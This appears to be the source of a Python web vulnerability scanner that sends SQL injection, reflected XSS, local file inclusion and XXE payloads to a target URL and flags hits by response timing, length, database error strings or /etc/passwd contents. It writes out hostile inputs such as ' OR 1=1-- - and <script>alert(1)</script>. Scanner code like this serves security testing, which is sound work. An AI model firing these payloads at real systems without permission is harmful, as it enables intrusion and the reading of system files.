import re
from core.utils import Requester, load_config, setup_logger
from core.payloads import sqli_payloads, xxe_payloads, lfi_payloads

class Scanner:
    def __init__(self, target_url, proxy=None):
        self.target = target_url.rstrip('/')
        self.req = Requester(proxy=proxy)
        self.logger = setup_logger('Scanner')
        self.cfg = load_config()
    
    def detect_sqli(self, param, test_value="1"):
        """Detect SQL injection (boolean, time, error based)"""
        base_url = f"{self.target}?{param}={test_value}"
        baseline = self.req.get(base_url)
        if not baseline:
            return False, None
        
        for payload in sqli_payloads.SQLI_PAYLOADS:
            test_url = f"{self.target}?{param}={test_value}{payload}"
            import time
            start = time.time()
            resp = self.req.get(test_url)
            elapsed = time.time() - start
            
            # Time based
            if "SLEEP" in payload.upper() or "DELAY" in payload.upper():
                if elapsed > 5:
                    return True, f"time_based_sqli ({payload})"
            
            # Boolean based
            if resp and len(resp.text) != len(baseline.text):
                # Coba lagi dengan payload ' AND 1=2 untuk konfirmasi
                false_payload = f"{test_value}' AND 1=2-- -"
                false_url = f"{self.target}?{param}={false_payload}"
                false_resp = self.req.get(false_url)
                if false_resp and len(false_resp.text) != len(baseline.text):
                    return True, f"boolean_based_sqli ({payload})"
        
        # Error based
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"ORA-[0-9]{5}",
            r"PostgreSQL.*ERROR",
            r"Microsoft.*ODBC"
        ]
        test_payload = f"{test_value}' OR 1=1-- -"
        test_url = f"{self.target}?{param}={test_payload}"
        resp = self.req.get(test_url)
        if resp:
            for pattern in error_patterns:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    return True, f"error_based_sqli ({pattern})"
        return False, None
    
    def detect_xss(self, param, test_value="test"):
        """Detect reflected XSS"""
        payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
        for payload in payloads:
            test_url = f"{self.target}?{param}={test_value}{payload}"
            resp = self.req.get(test_url)
            if resp and payload in resp.text:
                return True, f"reflected_xss ({payload})"
        return False, None
    
    def detect_lfi(self, param, test_value="test"):
        """Detect Local File Inclusion"""
        for payload in lfi_payloads.LFI_PAYLOADS:
            test_url = f"{self.target}?{param}={payload}"
            resp = self.req.get(test_url)
            if resp:
                if "root:x:" in resp.text or "bin/bash" in resp.text or "[boot loader]" in resp.text:
                    return True, f"lfi_detected ({payload})"
        return False, None
    
    def detect_xxe(self, endpoint, method="post"):
        """Detect XXE by sending XML payloads"""
        if not self.cfg['scan']['detect_xxe']:
            return False, None
        for payload in xxe_payloads.XXE_PAYLOADS:
            headers = {'Content-Type': 'application/xml'}
            url = f"{self.target}/{endpoint.lstrip('/')}"
            if method.lower() == 'post':
                resp = self.req.post(url, data=payload, headers=headers)
            else:
                continue
            if resp and ("root:" in resp.text or "etc/passwd" in resp.text or "<?xml" in resp.text):
                return True, "xxe_detected"
        return False, None
